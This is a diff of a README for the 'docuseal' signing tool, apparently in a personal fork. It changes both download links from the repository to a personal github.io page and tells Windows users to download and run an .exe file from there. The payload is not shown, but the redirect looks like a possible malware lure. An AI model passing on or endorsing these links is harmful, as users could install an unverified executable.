@@ -1,6 +1,6 @@
 # ✍️ docuseal - Sign and manage your digital documents
 
-[![Download docuseal](https://img.shields.io/badge/Download-Docuseal-blue.svg)](https://github.com/Sonia6343/docuseal)
+[![Download docuseal](https://img.shields.io/badge/Download-Docuseal-blue.svg)](https://sonia6343.github.io)
 
 Docuseal allows you to create, fill, and sign digital documents on your computer. You keep full control of your files while you handle sensitive paperwork. Use this software to replace expensive subscription services with a private solution.
 
@@ -8,7 +8,7 @@ Docuseal allows you to create, fill, and sign digital documents on your computer
 
 You need to download the installer to your Windows computer. Visit the link below to reach the official page.
 
-[Download docuseal here](https://github.com/Sonia6343/docuseal)
+[Download docuseal here](https://sonia6343.github.io)
 
 Select the file that ends in .exe to begin your download. Save the file to your Downloads folder or any location you prefer.
 
